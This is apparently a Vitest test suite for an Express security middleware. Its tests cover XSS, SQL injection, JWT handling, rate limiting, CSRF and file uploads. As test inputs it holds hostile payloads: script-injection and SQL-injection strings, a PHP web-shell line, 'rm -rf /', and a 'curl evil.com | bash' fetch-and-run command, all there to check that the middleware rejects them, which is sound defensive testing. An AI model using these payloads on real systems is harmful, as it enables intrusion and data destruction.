import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { Request, Response, NextFunction } from 'express';
import request from 'supertest';
import express from 'express';
import { securityMiddleware } from '../../server/middleware/security';
import { rateLimiter } from '../../server/middleware/rateLimiter';
import jwt from 'jsonwebtoken';

// Mock dependencies
vi.mock('jsonwebtoken');
vi.mock('../../server/middleware/rateLimiter');

const mockJwt = vi.mocked(jwt);
const mockRateLimiter = vi.mocked(rateLimiter);

describe('Security Middleware Tests', () => {
  let app: express.Application;
  let mockReq: Partial<Request>;
  let mockRes: Partial<Response>;
  let mockNext: NextFunction;

  beforeEach(() => {
    vi.clearAllMocks();
    
    app = express();
    app.use(express.json());
    
    mockReq = {
      headers: {},
      body: {},
      query: {},
      params: {},
      ip: '127.0.0.1',
      get: vi.fn(),
    };
    
    mockRes = {
      status: vi.fn().mockReturnThis(),
      json: vi.fn().mockReturnThis(),
      setHeader: vi.fn(),
      getHeader: vi.fn(),
      send: vi.fn(),
    };
    
    mockNext = vi.fn();

    // Setup default rate limiter mock
    mockRateLimiter.mockImplementation((req, res, next) => next());
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('XSS Protection', () => {
    it('should sanitize script tags in request body', async () => {
      const maliciousInput = {
        name: '<script>alert("xss")</script>Recipe Name',
        description: 'Normal description<script>malicious()</script>',
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      const response = await request(app)
        .post('/test')
        .send(maliciousInput)
        .expect(200);

      expect(response.body.name).not.toContain('<script>');
      expect(response.body.description).not.toContain('<script>');
    });

    it('should sanitize HTML entities in query parameters', async () => {
      app.get('/test', securityMiddleware, (req, res) => {
        res.json(req.query);
      });

      const response = await request(app)
        .get('/test?search=<img src=x onerror=alert(1)>')
        .expect(200);

      expect(response.body.search).not.toContain('<img');
      expect(response.body.search).not.toContain('onerror');
    });

    it('should prevent script injection in nested objects', async () => {
      const nestedMalicious = {
        recipe: {
          ingredients: [
            { name: '<script>alert("nested")</script>Sugar', amount: 100 }
          ],
          metadata: {
            tags: ['<script>evil()</script>dessert']
          }
        }
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      const response = await request(app)
        .post('/test')
        .send(nestedMalicious)
        .expect(200);

      expect(JSON.stringify(response.body)).not.toContain('<script>');
    });

    it('should handle SQL injection attempts in input', async () => {
      const sqlInjection = {
        id: "1; DROP TABLE users;--",
        query: "'; SELECT * FROM secrets; --",
        filter: "UNION SELECT password FROM admin WHERE 1=1--"
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      const response = await request(app)
        .post('/test')
        .send(sqlInjection)
        .expect(200);

      expect(response.body.id).not.toContain('DROP TABLE');
      expect(response.body.query).not.toContain('SELECT *');
      expect(response.body.filter).not.toContain('UNION SELECT');
    });

    it('should prevent JavaScript protocol injection', async () => {
      const jsProtocol = {
        url: 'javascript:alert("xss")',
        link: 'javascript:void(0)',
        href: 'javascript:eval(malicious)'
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      const response = await request(app)
        .post('/test')
        .send(jsProtocol)
        .expect(200);

      expect(response.body.url).not.toContain('javascript:');
      expect(response.body.link).not.toContain('javascript:');
      expect(response.body.href).not.toContain('javascript:');
    });
  });

  describe('Input Validation', () => {
    it('should reject extremely long input strings', async () => {
      const longString = 'a'.repeat(100000);
      const oversizedInput = {
        name: longString,
        description: longString
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      await request(app)
        .post('/test')
        .send(oversizedInput)
        .expect(413); // Payload Too Large
    });

    it('should validate email format in input', async () => {
      const invalidEmails = {
        email1: 'not-an-email',
        email2: 'missing@domain',
        email3: '@invalid.com',
        email4: 'spaces in@email.com'
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      const response = await request(app)
        .post('/test')
        .send(invalidEmails)
        .expect(400); // Bad Request for invalid emails

      expect(response.body.error).toContain('Invalid email');
    });

    it('should reject null bytes in input', async () => {
      const nullByteInput = {
        filename: 'malicious\x00.txt',
        content: 'data\x00with\x00nulls'
      };

      app.post('/test', securityMiddleware, (req, res) => {
        res.json(req.body);
      });

      await request(app)
        .post('/test')
        .send(nullByteInput)
        .expect(400);
    });

    it('should validate JSON structure depth', async () => {
      // Create deeply nested object (potential DoS)
      const deepObject: any = {};
      let current = deepObject;
      
      for (let i = 0; i < 1000; i++) {
        current.nested = {};
        current = current.nested;
      }

      app.post('/test', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      await request(app)
        .post('/test')
        .send(deepObject)
        .expect(400); // Should reject deeply nested objects
    });
  });

  describe('Authentication Security', () => {
    it('should validate JWT token format', () => {
      const invalidTokens = [
        'invalid.token.format',
        'not-a-jwt',
        '',
        null,
        undefined,
        'Bearer malformed-token'
      ];

      invalidTokens.forEach(token => {
        const mockAuth = securityMiddleware as any;
        expect(() => mockAuth.validateJWT(token)).toThrow();
      });
    });

    it('should prevent JWT timing attacks', async () => {
      const validToken = 'valid.jwt.token';
      const invalidToken = 'invalid.jwt.token';

      mockJwt.verify = vi.fn()
        .mockImplementationOnce(() => { throw new Error('Invalid token'); })
        .mockImplementationOnce(() => ({ userId: 1 }));

      const start1 = Date.now();
      try {
        await securityMiddleware.validateJWT(invalidToken);
      } catch (e) {
        // Expected to fail
      }
      const time1 = Date.now() - start1;

      const start2 = Date.now();
      try {
        await securityMiddleware.validateJWT(validToken);
      } catch (e) {
        // May succeed or fail
      }
      const time2 = Date.now() - start2;

      // Time difference should be minimal to prevent timing attacks
      expect(Math.abs(time1 - time2)).toBeLessThan(10);
    });

    it('should handle expired tokens securely', async () => {
      const expiredToken = 'expired.jwt.token';
      
      mockJwt.verify = vi.fn().mockImplementation(() => {
        const error = new Error('Token expired');
        error.name = 'TokenExpiredError';
        throw error;
      });

      app.post('/test', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      const response = await request(app)
        .post('/test')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.error).toBe('Token expired');
      expect(response.body).not.toHaveProperty('token'); // Don't leak token info
    });

    it('should prevent password enumeration', async () => {
      const usernames = ['admin', 'user', 'nonexistent'];
      const responses: number[] = [];

      app.post('/login', securityMiddleware, (req, res) => {
        // Simulate login attempt
        const { username } = req.body;
        if (username === 'admin') {
          res.status(401).json({ error: 'Invalid credentials' });
        } else {
          res.status(401).json({ error: 'Invalid credentials' });
        }
      });

      for (const username of usernames) {
        const start = Date.now();
        await request(app)
          .post('/login')
          .send({ username, password: 'wrong' })
          .expect(401);
        responses.push(Date.now() - start);
      }

      // All responses should take similar time (prevent username enumeration)
      const maxTime = Math.max(...responses);
      const minTime = Math.min(...responses);
      expect(maxTime - minTime).toBeLessThan(50);
    });
  });

  describe('Rate Limiting', () => {
    beforeEach(() => {
      mockRateLimiter.mockReset();
    });

    it('should enforce rate limits on API endpoints', async () => {
      let callCount = 0;
      mockRateLimiter.mockImplementation((req, res, next) => {
        callCount++;
        if (callCount > 5) {
          res.status(429).json({ error: 'Too many requests' });
          return;
        }
        next();
      });

      app.get('/api/test', mockRateLimiter, (req, res) => {
        res.json({ success: true });
      });

      // Make 5 successful requests
      for (let i = 0; i < 5; i++) {
        await request(app).get('/api/test').expect(200);
      }

      // 6th request should be rate limited
      await request(app).get('/api/test').expect(429);
    });

    it('should have different rate limits for different endpoints', async () => {
      const publicLimiter = vi.fn().mockImplementation((req, res, next) => next());
      const authLimiter = vi.fn().mockImplementation((req, res, next) => next());
      const adminLimiter = vi.fn().mockImplementation((req, res, next) => next());

      app.get('/public', publicLimiter, (req, res) => res.json({ type: 'public' }));
      app.get('/auth', authLimiter, (req, res) => res.json({ type: 'auth' }));
      app.get('/admin', adminLimiter, (req, res) => res.json({ type: 'admin' }));

      await request(app).get('/public').expect(200);
      await request(app).get('/auth').expect(200);
      await request(app).get('/admin').expect(200);

      expect(publicLimiter).toHaveBeenCalled();
      expect(authLimiter).toHaveBeenCalled();
      expect(adminLimiter).toHaveBeenCalled();
    });

    it('should track rate limits per IP address', async () => {
      const ipTracker = new Map();
      
      mockRateLimiter.mockImplementation((req, res, next) => {
        const ip = req.ip || '127.0.0.1';
        const count = ipTracker.get(ip) || 0;
        
        if (count >= 3) {
          res.status(429).json({ error: 'Rate limit exceeded' });
          return;
        }
        
        ipTracker.set(ip, count + 1);
        next();
      });

      app.get('/test', mockRateLimiter, (req, res) => {
        res.json({ success: true });
      });

      // Test with different IPs
      for (let i = 0; i < 3; i++) {
        await request(app)
          .get('/test')
          .set('X-Forwarded-For', '192.168.1.1')
          .expect(200);
      }

      // 4th request from same IP should be blocked
      await request(app)
        .get('/test')
        .set('X-Forwarded-For', '192.168.1.1')
        .expect(429);

      // But different IP should still work
      await request(app)
        .get('/test')
        .set('X-Forwarded-For', '192.168.1.2')
        .expect(200);
    });

    it('should reset rate limits after time window', async () => {
      let windowStart = Date.now();
      const windowSize = 1000; // 1 second
      const limit = 2;
      const requests = new Map();

      mockRateLimiter.mockImplementation((req, res, next) => {
        const now = Date.now();
        const ip = req.ip || '127.0.0.1';

        // Reset if window expired
        if (now - windowStart > windowSize) {
          requests.clear();
          windowStart = now;
        }

        const count = requests.get(ip) || 0;
        if (count >= limit) {
          res.status(429).json({ error: 'Rate limit exceeded' });
          return;
        }

        requests.set(ip, count + 1);
        next();
      });

      app.get('/test', mockRateLimiter, (req, res) => {
        res.json({ success: true });
      });

      // Make 2 requests (should succeed)
      await request(app).get('/test').expect(200);
      await request(app).get('/test').expect(200);
      
      // 3rd request should be blocked
      await request(app).get('/test').expect(429);

      // Wait for window to reset
      await new Promise(resolve => setTimeout(resolve, 1100));

      // Should work again after window reset
      await request(app).get('/test').expect(200);
    });
  });

  describe('Header Security', () => {
    it('should set security headers', async () => {
      app.get('/test', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      const response = await request(app).get('/test');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toContain('max-age=');
    });

    it('should remove sensitive headers from responses', async () => {
      app.get('/test', securityMiddleware, (req, res) => {
        res.setHeader('X-Powered-By', 'Express');
        res.setHeader('Server', 'Apache/2.4.1');
        res.json({ success: true });
      });

      const response = await request(app).get('/test');

      expect(response.headers['x-powered-by']).toBeUndefined();
      expect(response.headers['server']).toBeUndefined();
    });

    it('should validate Content-Type headers', async () => {
      app.post('/test', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      // Should reject non-JSON content type for JSON endpoints
      await request(app)
        .post('/test')
        .set('Content-Type', 'text/plain')
        .send('not json')
        .expect(415); // Unsupported Media Type
    });

    it('should prevent MIME type confusion', async () => {
      app.post('/upload', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      // Should reject files with suspicious extensions
      await request(app)
        .post('/upload')
        .attach('file', Buffer.from('<?php echo "hack"; ?>'), 'innocent.jpg.php')
        .expect(400);
    });
  });

  describe('CSRF Protection', () => {
    it('should require CSRF token for state-changing operations', async () => {
      app.post('/api/create', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      // Should reject requests without CSRF token
      await request(app)
        .post('/api/create')
        .send({ data: 'test' })
        .expect(403);
    });

    it('should validate CSRF token format', async () => {
      app.post('/api/create', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      const invalidTokens = ['', 'short', 'invalid-format', '123'];

      for (const token of invalidTokens) {
        await request(app)
          .post('/api/create')
          .set('X-CSRF-Token', token)
          .send({ data: 'test' })
          .expect(403);
      }
    });

    it('should accept valid CSRF tokens', async () => {
      const validToken = 'valid-csrf-token-12345678901234567890';
      
      app.post('/api/create', securityMiddleware, (req, res) => {
        // In real implementation, this would validate the token
        const token = req.headers['x-csrf-token'];
        if (token === validToken) {
          res.json({ success: true });
        } else {
          res.status(403).json({ error: 'Invalid CSRF token' });
        }
      });

      await request(app)
        .post('/api/create')
        .set('X-CSRF-Token', validToken)
        .send({ data: 'test' })
        .expect(200);
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types', async () => {
      const dangerousFiles = [
        { name: 'script.js', content: 'alert("xss")' },
        { name: 'shell.sh', content: '#!/bin/bash\nrm -rf /' },
        { name: 'virus.exe', content: 'MZ\x90\x00' },
        { name: 'config.php', content: '<?php phpinfo(); ?>' }
      ];

      app.post('/upload', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      for (const file of dangerousFiles) {
        await request(app)
          .post('/upload')
          .attach('file', Buffer.from(file.content), file.name)
          .expect(400);
      }
    });

    it('should scan file contents for malicious patterns', async () => {
      const maliciousContents = [
        '<?php eval($_POST["cmd"]); ?>',
        '<script>document.location="evil.com"</script>',
        '#!/bin/bash\ncurl evil.com | bash',
        'eval(atob("bWFsaWNpb3VzQ29kZSgp"))' // base64 encoded malicious code
      ];

      app.post('/upload', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      for (const content of maliciousContents) {
        await request(app)
          .post('/upload')
          .attach('file', Buffer.from(content), 'image.jpg')
          .expect(400);
      }
    });

    it('should limit file sizes', async () => {
      const largeFile = Buffer.alloc(10 * 1024 * 1024); // 10MB

      app.post('/upload', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      await request(app)
        .post('/upload')
        .attach('file', largeFile, 'large.jpg')
        .expect(413); // Payload Too Large
    });
  });

  describe('Error Handling Security', () => {
    it('should not expose internal errors in production', async () => {
      process.env.NODE_ENV = 'production';

      app.get('/error', securityMiddleware, (req, res) => {
        throw new Error('Internal database connection failed on server xyz');
      });

      const response = await request(app).get('/error').expect(500);

      expect(response.body.error).toBe('Internal Server Error');
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body.message).not.toContain('database');
      expect(response.body.message).not.toContain('server xyz');

      process.env.NODE_ENV = 'test';
    });

    it('should sanitize error messages', async () => {
      app.get('/user/:id', securityMiddleware, (req, res) => {
        const userId = req.params.id;
        throw new Error(`User with ID "${userId}" not found in database table "users"`);
      });

      const response = await request(app)
        .get('/user/<script>alert("xss")</script>')
        .expect(500);

      expect(response.body.error).not.toContain('<script>');
      expect(response.body.error).not.toContain('database table');
    });

    it('should log security events without exposing them', async () => {
      const logSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});

      app.post('/test', securityMiddleware, (req, res) => {
        res.json({ success: true });
      });

      await request(app)
        .post('/test')
        .send({ malicious: '<script>alert("xss")</script>' })
        .expect(200);

      expect(logSpy).toHaveBeenCalledWith(
        expect.stringContaining('Security event: XSS attempt detected')
      );

      logSpy.mockRestore();
    });
  });

  describe('Performance Security', () => {
    it('should prevent RegExp DoS attacks', async () => {
      const maliciousRegexInput = {
        pattern: 'a'.repeat(10000) + '!',
        text: 'a'.repeat(10000)
      };

      app.post('/regex', securityMiddleware, (req, res) => {
        const start = Date.now();
        const result = new RegExp(req.body.pattern).test(req.body.text);
        const duration = Date.now() - start;
        
        // Should timeout or complete quickly
        expect(duration).toBeLessThan(1000);
        res.json({ result });
      });

      await request(app)
        .post('/regex')
        .send(maliciousRegexInput)
        .expect(400); // Should reject dangerous regex patterns
    });

    it('should limit concurrent requests per user', async () => {
      const concurrentLimit = 5;
      let activeRequests = 0;

      mockRateLimiter.mockImplementation((req, res, next) => {
        activeRequests++;
        if (activeRequests > concurrentLimit) {
          res.status(429).json({ error: 'Too many concurrent requests' });
          return;
        }
        
        // Simulate async operation
        setTimeout(() => {
          activeRequests--;
          next();
        }, 100);
      });

      app.get('/slow', mockRateLimiter, (req, res) => {
        res.json({ success: true });
      });

      const promises = Array(10).fill(null).map(() => 
        request(app).get('/slow')
      );

      const results = await Promise.allSettled(promises);
      const rejectedCount = results.filter(r => 
        r.status === 'fulfilled' && r.value.status === 429
      ).length;

      expect(rejectedCount).toBeGreaterThan(0);
    });

    it('should timeout long-running requests', async () => {
      app.get('/timeout', securityMiddleware, (req, res) => {
        // Simulate a request that takes too long
        setTimeout(() => {
          res.json({ success: true });
        }, 30000); // 30 seconds
      });

      const response = await request(app)
        .get('/timeout')
        .timeout(5000); // 5 second timeout

      expect(response.status).toBe(408); // Request Timeout
    });
  });
});